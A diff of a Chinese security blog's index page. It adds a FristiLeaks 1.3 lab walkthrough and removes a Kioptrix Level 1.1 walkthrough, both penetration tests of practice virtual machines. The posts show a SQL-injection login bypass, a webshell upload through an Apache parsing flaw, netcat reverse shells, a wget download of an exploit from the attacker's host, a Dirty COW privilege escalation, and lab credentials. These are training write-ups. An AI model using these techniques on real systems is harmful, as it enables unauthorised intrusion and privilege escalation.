@@ -255,6 +255,142 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/02/FristiLeaks-1-3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="十三">
+      <meta itemprop="description" content="潜心学习，不骄不躁">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="十三の博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/11/02/FristiLeaks-1-3/" class="post-title-link" itemprop="url">FristiLeaks_1.3</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-11-02 15:34:54 / 修改时间：15:36:34" itemprop="dateCreated datePublished" datetime="2022-11-02T15:34:54+08:00">2022-11-02</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="FristiLeaks-1-3"><a href="#FristiLeaks-1-3" class="headerlink" title="FristiLeaks_1.3"></a>FristiLeaks_1.3</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>记得改nat模式。</p>
+<p>nmap查看对方ip地址</p>
+<p>改了nat之后，vm用户需要手动更改mac地址为</p>
+<p>08:00:27:A5:A6:76</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102140304341.png" alt="image-20221102140304341"></p>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p><code>nmap 192.168.100.0/24 -n -sP -sn</code></p>
+<p>扫到目标地址为，192.168.100.168</p>
+<p>然后还是扫端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.100.168</span><br></pre></td></tr></table></figure>
+
+<p>只有一个80端口？</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102140812413.png" alt="image-20221102140812413"></p>
+<p>是这么个东西</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102141214460.png" alt="image-20221102141214460"></p>
+<p>刚刚扫到个robots先看看。</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102141315482.png" alt="image-20221102141315482"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Disallow: /cola</span><br><span class="line">Disallow: /sisi</span><br><span class="line">Disallow: /beer</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h1><p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102141938396.png" alt="image-20221102141938396"></p>
+<p>还是扫一下目录把，目录也没扫到，看了攻略，是index中的</p>
+<p>fristi有提示。</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143115854.png" alt="image-20221102143115854"></p>
+<p>拼接url进入如下页面。所以要注意各种微小的东西，这些都是靶场中的提示，和实战中并不一样。</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143103409.png" alt="image-20221102143103409"></p>
+<p>下面有个登录框，弱口令sql测试过了，没用。</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143335952.png" alt="image-20221102143335952"></p>
+<p>扫目录扫出来个no！</p>
+<p>暂时还不知道干什么用的。</p>
+<p>查看登录框界面的前端代码会发现注释，有一大串base64</p>
+<p>解码之后发现是一个png</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102143558311.png" alt="image-20221102143558311"></p>
+<p>将他在kali中解码为png文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d base64.txt &gt; base64.png</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102144626370.png" alt="image-20221102144626370"></p>
+<p>得到密码为，keKkeKKeKKeKkEkkEk</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102144843878.png" alt="image-20221102144843878"></p>
+<p>同时在html的注释中还有发信人的名字，</p>
+<p>eezeepz</p>
+<h1 id="漏洞利用-upload"><a href="#漏洞利用-upload" class="headerlink" title="漏洞利用-upload"></a>漏洞利用-upload</h1><p>成功登录！随后就是一个上传文件的目录，然后尝试上传冰蝎的木马</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102145147078.png" alt="image-20221102145147078"></p>
+<p>害得来一个绕过，那我们就进行一个绕过。%00和00截断都用过了，应该是白名单，而且正常无法绕。但是这是一个Apache服务器，尝试寻找他的解析漏洞进行getshell。</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150027246.png" alt="image-20221102150027246"></p>
+<p>apache 2.2.15</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150144080.png" alt="image-20221102150144080"></p>
+<p>多文件名后缀的解析漏洞。</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150222722.png" alt="image-20221102150222722"></p>
+<p>解析成功，使用冰蝎连接。</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150330655.png" alt="image-20221102150330655"></p>
+<p>这是一个</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150349992.png" alt="image-20221102150349992"></p>
+<p>apache权限的用户，所以还需要进行一个提权。</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>先弹一个nc来我们的kali上面</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150546777.png" alt="image-20221102150546777"></p>
+<p>弹是弹回来了，但是输入一个字母就要出现两个字母，就很麻烦诶。</p>
+<p>发现其中有个文件<code>checklogin.php</code></p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150634958.png" alt="image-20221102150634958"></p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102150733991.png" alt="image-20221102150733991"></p>
+<p>拿到mysql的账号密码，一下子就想到了udf提权。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eezeepz</span><br><span class="line">4ll3maal12#</span><br></pre></td></tr></table></figure>
+
+<p>但是我记得udf提权是需要root的mysql用户，这就十分尴尬了。</p>
+<p>随后想到了脏牛提权,上传我祖传的脏牛脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty 123456</span><br></pre></td></tr></table></figure>
+
+<p>随后登录我们的firefart账户就可以了</p>
+<p><img src="/2022/11/02/FristiLeaks-1-3/image-20221102153136131.png" alt="image-20221102153136131"></p>
+<p>拿下权限</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个靶场相比前面的靶场难度有所提升，有些地方没想到却是还是借助了攻略。但是我记得某个大佬说过，这些靶场既然是靶场那就是存在漏洞的，那么作者最有可能的是在漏洞的隐藏上面下功夫，而不是在利用上面。所以以后我们必须要注重的是靶场中的一些细节，一定要做好，看好。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/02/KIOPTRIX-LEVEL-1-3-4/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -521,122 +657,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="https://wanheiqiyihu.top/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="十三">
-      <meta itemprop="description" content="潜心学习，不骄不躁">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="十三の博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/" class="post-title-link" itemprop="url">KIOPTRIX: LEVEL 1.1 (#2)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-11-01 16:02:55 / 修改时间：16:04:38" itemprop="dateCreated datePublished" datetime="2022-11-01T16:02:55+08:00">2022-11-01</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/bachang/" itemprop="url" rel="index"><span itemprop="name">-bachang</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="KIOPTRIX-LEVEL-1-1-2"><a href="#KIOPTRIX-LEVEL-1-1-2" class="headerlink" title="KIOPTRIX: LEVEL 1.1 (#2)"></a>KIOPTRIX: LEVEL 1.1 (#2)</h1><p>现在的我是刷靶场狂魔，同时也继续在了解oscp相关的介绍，争取寒假的时候就给考完把。</p>
-<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先还是通过nmap扫c段拿到自己靶机的位置（记得改nat</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101150334027.png" alt="image-20221101150334027"></p>
-<p>对其进行详细扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.100.151</span><br></pre></td></tr></table></figure>
-
-<p>扫完之后发现开启了，22,80,111,443,631,3306端口</p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101150554922.png" alt="image-20221101150554922"></p>
-<h2 id="漏洞利用-80端口"><a href="#漏洞利用-80端口" class="headerlink" title="漏洞利用-80端口"></a>漏洞利用-80端口</h2><p>扫完之后，访问这个网站，是一个登录页面</p>
-<p>直接万能密码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
-
-<p>就直接进去了</p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151226173.png" alt="image-20221101151226173"></p>
-<p>这个看样子是个ping的功能，我估摸着就以前ctf那种绕过呗。</p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151328801.png" alt="image-20221101151328801"></p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151334154.png" alt="image-20221101151334154"></p>
-<p>这直接就是一个rce</p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151355200.png" alt="image-20221101151355200"></p>
-<p>但是是apache的权限，目前需要进行一个提权，说实话，我对提权部分都不是很了解，所以在备考的时候，肯定会补上常见提权这个大坑。</p>
-<p>先弹一个nc回来。</p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101151711771.png" alt="image-20221101151711771"></p>
-<p>通过这个东西</p>
-<p><code>cat /proc/version</code>(这个找不到，导致后面搜错了)</p>
-<p><code>lsb_release -a</code>这个找到的</p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101153429032.png" alt="image-20221101153429032"></p>
-<p><code>searchsploit centos 4.5</code></p>
-<p>我用kali上的没成功，下载一下这个网址上面的</p>
-<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></p>
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101154418307.png" alt="image-20221101154418307"></p>
-<p>下载下面那个</p>
-<p>随后起一个http服务将exp传到那边去</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 2333</span><br><span class="line">python.exe -m SimpleHTTPServer 2333</span><br><span class="line">python -m http.server 2333</span><br><span class="line"></span><br><span class="line">反弹shell中执行</span><br><span class="line">mkdir /tmp/sh(如果是提权的话，目前用户需要先创建一个可以创建新文件的文件夹进行操作)</span><br><span class="line">cd /tmp/sh</span><br><span class="line">wget http://192.168.100.129:2333/9542.c</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101155212618.png" alt="image-20221101155212618"></p>
-<p>传过去之后编译执行即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -o okk 764.c -lcrypto</span><br><span class="line">./okk</span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2022/11/01/%C2%96KIOPTRIX-LEVEL-1-1-2/image-20221101155457890.png" alt="image-20221101155457890"></p>
-<p>又是成功拿下这台靶机，感觉比上一个还简单。而且还是几乎脱离攻略做的</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>同样是，找ip，扫端口，看漏洞，利用，提权。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/28/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><span class="page-number current">29</span><a class="page-number" href="/page/30/">30</a><span class="space">&hellip;</span><a class="page-number" href="/page/58/">58</a><a class="extend next" rel="next" href="/page/30/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/28/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/28/">28</a><span class="page-number current">29</span><a class="page-number" href="/page/30/">30</a><span class="space">&hellip;</span><a class="page-number" href="/page/59/">59</a><a class="extend next" rel="next" href="/page/30/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -704,7 +728,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">174</span>
+          <span class="site-state-item-count">175</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
